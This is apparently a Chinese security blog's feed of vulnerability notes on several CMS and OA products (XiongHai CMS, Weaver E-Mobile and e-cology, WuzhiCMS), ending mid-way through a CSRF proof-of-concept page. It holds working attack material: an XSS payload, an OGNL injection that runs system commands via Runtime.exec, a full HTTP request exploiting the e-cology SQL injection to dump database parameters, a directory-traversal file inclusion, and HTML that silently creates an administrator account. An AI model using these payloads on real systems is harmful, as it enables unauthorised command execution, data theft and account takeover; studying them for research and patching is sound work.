      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>反射型XSS</p><p>漏洞位置：files/contact.php 第12~15行<br><img src="反射型XSS/20200417211129-f38ef3a2-80ac-1.png" alt></p><pre><code>$page=addslashes($_GET[&apos;page&apos;]);if ($page&lt;&gt;&quot;&quot;){if ($page&lt;&gt;1){$pages=&quot;第&quot;.$page.&quot;页 - &quot;;</code></pre><p>经过一次addslashes函数处理就直接带入页面。</p><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>我们访问网址的联系功能，找到了代码对于的page参数，其实就是留言列表的页数。<br><img src="反射型XSS/20200417211052-dd4dec10-80ac-1.png" alt><br>我们尝试插入一个简单XSS payload</p><pre><code>page=&lt;img src=x onerror=alert(/xss/);&gt;</code></pre><p><img src="反射型XSS/20200417211013-c6557776-80ac-1.png" alt></p><p>漏洞利用成功。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>结合RIPS扫描结果可发现多处sql注入漏洞，该CMS采用过滤方式大多是通过addslashes()函数过滤。<br><img src="前台多处SQL注入/20200417210349-e12950f0-80ab-1.png" alt></p><p>单纯使用addslashes()函数会造成两个问题：</p><p>1.是否采用GBK（宽字节注入）</p><p>2.sql语句是否采用了单引号闭合。</p><p><strong>software.php</strong></p><p>漏洞位置：files/software.php第13行，where后字句忘记加单引号保护。</p><pre><code>$query = &quot;UPDATE download SET hit = hit+1 WHERE id=$id&quot;;</code></pre><p><img src="前台多处SQL注入/20200417210507-0f895896-80ac-1.png" alt></p><p><strong>ontent.php</strong></p><p>漏洞位置：files/content.php第19行，where后字句忘记加单引号保护。</p><pre><code>$query = &quot;UPDATE content SET hit = hit+1 WHERE id=$id&quot;;</code></pre><p><strong>submit.php</strong></p><p>首先可看见 过滤和传参</p><pre><code>$type=addslashes($_GET[&apos;type&apos;]);$name=$_POST[&apos;name&apos;];$mail=$_POST[&apos;mail&apos;];$url=$_POST[&apos;url&apos;];$content=$_POST[&apos;content&apos;];$cid=$_POST[&apos;cid&apos;];$ip=$_SERVER[&quot;REMOTE_ADDR&quot;];$tz=$_POST[&apos;tz&apos;];if ($tz==&quot;&quot;){$tz=0;}$jz=$_POST[&apos;jz&apos;];</code></pre><p>只对type参数进行了过滤，因此其他参数涉及到sql语句的可能存在sql注入。</p><p>漏洞位置：files/submit.php第66行</p><pre><code>$query = &quot;SELECT * FROM interaction WHERE( mail = &apos;$mail&apos;)&quot;;</code></pre><p>漏洞位置：files/submit.php 第121-147行</p><pre><code>$query = &quot;INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&apos;$type&apos;,&apos;$xs&apos;,&apos;$cid&apos;,&apos;$name&apos;,&apos;$mail&apos;,&apos;$url&apos;,&apos;$touxiang&apos;,&apos;$shebei&apos;,&apos;$ip&apos;,&apos;$content&apos;,&apos;$tz&apos;,now())&quot;;</code></pre><p>漏洞位置：files/submit.php 第176行</p><pre><code>$query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;;</code></pre><p>漏洞位置：files/submit.php 第206行</p><pre><code>$query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;;</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>跟进文件</p><pre><code>&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&apos;r&apos;]); //接收文件名$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于indexinclude(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件?&gt;</code></pre><p>代码逻辑大概为，通过GET型传参传入r，并将值经过一个addslashes()函数操作，然后一个三元运算符判断要载入的文件，直接进入include函数包含。</p><p>include(‘files/‘.$action.’.php’);这条语句包含了file目录下的文件。</p><pre><code>语法为：条件表达式？表达式1：表达式2问号前面的位置是判断的条件，判断结果为bool型，为true是调用表达式1，为false时调用表达式2.</code></pre><p>由代码逻辑可知，代码限制了我们访问的目录为file。</p><p>Bypass:可用../进行目录跳转。</p><h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>我们首先在cms根目录下新建一个phpinfo文件<br><img src="主目录存在文件包含/20200417210151-9b0952dc-80ab-1.png" alt></p><p>然后我们在本地访问index.php添加如下参数。即可正确解析phpinfo界面<br><img src="主目录存在文件包含/20200417210242-b94f5f48-80ab-1.png" alt><br>因为此处代码会自动在文件名后添加.php，所以我们不添加后缀名，否则无法正常解析</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="泛微e-mobile-ognl注入"><a href="#泛微e-mobile-ognl注入" class="headerlink" title="泛微e-mobile ognl注入"></a>泛微e-mobile ognl注入</h2><p>泛微 E-Mobile 表达式注入?大概?这个洞是一个月以前，老师丢给我玩的，叫我学习一下。<br>拿到的时候一脸懵逼，什么是表达式注入?去漏洞库看了一圈。<br>(・。・) 噢！原来可以执行算术运算就是表达式注入呀！<br>要怎么玩？当计算器用么？～ヾ(*´∇`)ﾉ</p><p>一、泛微OA E-Mobile WebServer:<strong>Apache</strong> 通用部分:<strong>apache</strong><br>官方有两个OA。一个是<strong>apache</strong>的 一个是<strong>Resin</strong>的。<br><strong>Resin</strong>的也找到姿势通杀了，但是<strong>Resin</strong>涉及的站太大了。。。暂时不放出来，因为好像和S2撞洞了？因为045打了WAF的 ，我这个可以执行命令。23333 我也不知道~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、登录页面如下</span><br><span class="line"></span><br><span class="line">http://6.6.6.6/login.do?</span><br><span class="line">or</span><br><span class="line">http://6.6.6.6/login/login.do?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2、当账号密码报错的时候，出现如下URL</span><br><span class="line">login.do?message=104&amp;verify=</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、直接改写message=的内容，试试算术运算。</span><br><span class="line">http://6.6.6.6/login.do?message=66*66*66-66666</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4、表达式注入。</span><br><span class="line">有的表达式注入是$&#123;code&#125;。这里隐藏了$&#123;&#125;，所以直接调用就行了。</span><br><span class="line">message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5、也可以通过`post`提交数据来进行注入，命令执行</span><br><span class="line">`post`如下数据也可以：</span><br><span class="line">message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p>====================================================================</p><p>网络实例</p><p><img src="泛微e-mobile ognl注入/640" alt="图片"></p><p>此版本为5.0</p><p>首先随便输入账号密码看提示信息</p><p><img src="泛微e-mobile ognl注入/640" alt="图片"></p><p>提示为104，地址栏message也显示了104,现在测试一下看看有没有注入</p><p>直接获取数据法: 加减乘除</p><p>表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括</p><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/login.do?message=104-2&amp;verify=</span><br></pre></td></tr></table></figure></li></ul><p><img src="泛微e-mobile ognl注入/640" alt="图片"></p><p>结果可以被执行成功，表示漏洞存在可注入</p><p>这里有两个poc可利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())下面需要Post请求message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="泛微e-mobile ognl注入/640" alt="图片"></p><p><img src="泛微e-mobile ognl注入/640" alt="图片"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>2019年10月，白帽汇安全研究院观测外网出现泛微办公软件的SQL注入漏洞，攻击者可在未经身份验证的情况下进行攻击，获得系统敏感数据。该漏洞目前属于0day，所有使用了Oracle数据库的泛微网站都有可能受到影响，且利用难度低，危害大（可获取密码等敏感信息），预计会对泛微的主要服务地区——中国市场产生一定冲击。</p><p><img src="泛微e-cology SQL注入漏洞/20191010181317791.png" alt="在这里插入图片描述"></p><p>该漏洞是由于OA系统的<code>WorkflowCenterTreeData</code>接口中涉及Oracle数据库的SQL语句缺乏安全检查措施所导致的，任意攻击者都可借SQL语句拼接时机注入恶意payload，造成SQL注入攻击。目前官方尚未发布漏洞补丁，所有使用了Oracle数据库的泛微网站都有可能受到影响，请相关网站管理人员在官方发布补丁前及时下线网站。</p><h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>目前FOFA系统最新数据（一年内数据）显示全球范围内共有10266个泛微服务（基于jsp语言）。中国大陆使用数量最多，共有10166个，中国香港第二，共有51个，美国第三，共有15个，新加坡第四，共有11个，英国第五，共有4个。</p><p>全球范围内泛微服务分布情况如下（仅为分布情况，非漏洞影响情况）。</p><p><img src="泛微e-cology SQL注入漏洞/20191010181324820.png" alt="在这里插入图片描述"></p><p>中国大陆地区广东省使用数量最多，共有1559个，四川省第二，共有1014个，河南省第三，共有1008个，江西省第四，共有961个，上海市省第五，共有811个。</p><p><img src="泛微e-cology SQL注入漏洞/20191010181330679.png" alt="在这里插入图片描述"></p><h2 id="危害等级"><a href="#危害等级" class="headerlink" title="危害等级"></a>危害等级</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">严重</span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>泛微e-cology OA系统的<code>WorkflowCenterTreeData</code>接口在接收到用户输入时会在未经过安全过滤的情况下直接拼接到SQL语句中，造成SQL注入。</p><p><img src="泛微e-cology SQL注入漏洞/201910101813371.png" alt="在这里插入图片描述"></p><p>（上图来源于网络）</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>所有使用了Oracle数据库的泛微服务都有可能存在漏洞。</p><h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>目前FOFA客户端平台已经更新该远程命令执行漏洞的检测POC。<br> <img src="泛微e-cology SQL注入漏洞/2019101018140442.png" alt="在这里插入图片描述"><br> POC截图</p><h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">暂无编号 </span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>由于目前没有官方补丁，请使用了泛微办公软件且后端数据库是Oracle的网站的管理员及时下线网站。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.weaver.com.cn/" target="_blank" rel="noopener">https://www.weaver.com.cn/</a></p><p>[2] <a href="https://baike.baidu.com/item/泛微/426156?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%B3%9B%E5%BE%AE/426156?fr=aladdin</a></p><p>白帽汇从事信息安全，专注于安全大数据、企业威胁情报。</p><p>公司产品：FOFA-网络空间安全搜索引擎、FOEYE-网络空间检索系统、NOSEC-安全讯息平台。</p><p>为您提供：网络空间测绘、企业资产收集、企业威胁情报、应急响应服务。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="泛微-e-cology-OA-前台SQL注入漏洞"><a href="#泛微-e-cology-OA-前台SQL注入漏洞" class="headerlink" title="泛微 e-cology OA 前台SQL注入漏洞"></a>泛微 e-cology OA 前台SQL注入漏洞</h3><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于手机和pc端，是当今比较主流的OA系统之一。  </p><h3 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a><strong>原理概述</strong></h3><p>该漏洞是由于OA系统的WorkflowCenterTreeData接口在收到用户输入的时候未进行安全过滤，  oracle数据库传入恶意SQL语句，导致SQL漏洞  </p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h3><p>使用oracle数据库的泛微 e-cology OA 系统  </p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>找到oracle数据库的泛微OA系统后直接使用Poc（已公开）  </p><p>如果不存在漏洞，则显示结果如下：  </p><p><img src="泛微 e-cology OA 前台SQL注入漏洞/8c73f20d47d1456ce3b279ea08f7ddc81ff.jpg" alt="img"></p><p>如果漏洞存在，则会直接回显很多数据:  </p><p><img src="泛微 e-cology OA 前台SQL注入漏洞/1584b3bd0feda39a5d1a96c4ba17e39642b.jpg" alt="img"></p><h3 id="Poc如下：（勿用于非法途径）"><a href="#Poc如下：（勿用于非法途径）" class="headerlink" title="Poc如下：（勿用于非法途径）"></a>Poc如下：（勿用于非法途径）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2236</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1</span><br></pre></td></tr></table></figure><p>修改NULL后为要查询的字段名,修改from后为查询的表  </p><p>简洁版POC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1</span><br><span class="line">formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>五指CMS 4.1.0存在CSRF漏洞可增加管理员账户</td><td>2018-04-10</td><td>套哥（<a href="mailto:taoge@5ecurity.cn" target="_blank" rel="noopener">taoge@5ecurity.cn</a>）</td><td><a href="https://github.com/wuzhicms/wuzhicms" target="_blank" rel="noopener">https://github.com/wuzhicms/wuzhicms</a></td><td><a href="https://github.com/wuzhicms/wuzhicms" target="_blank" rel="noopener">https://github.com/wuzhicms/wuzhicms</a></td><td>4.1.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9926" target="_blank" rel="noopener">CVE-2018-9926</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9927" target="_blank" rel="noopener">CVE-2018-9927</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。五指CMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/wuzhicms/wuzhicms/issues/128" target="_blank" rel="noopener">issues</a>告知作者。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>CSRF测试页面代码一如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    function post(url,fields)</span><br><span class="line">    &#123;</span><br><span class="line">    var p = document.createElement("form");</span><br><span class="line">    p.action = url;</span><br><span class="line">    p.innerHTML = fields;</span><br><span class="line">    p.target = "_self";</span><br><span class="line">    p.method = "post";</span><br><span class="line">    document.body.appendChild(p);</span><br><span class="line">    p.submit();</span><br><span class="line">    &#125;</span><br><span class="line">    function csrf_hack()</span><br><span class="line">    &#123;</span><br><span class="line">    var fields;</span><br><span class="line">    </span><br><span class="line"><span class="xml">    fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'form[role][]'</span> <span class="attr">value</span>=<span class="string">'1'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">    fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'form[username]'</span> <span class="attr">value</span>=<span class="string">'hack123'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">    fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'form[password]'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">    fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span 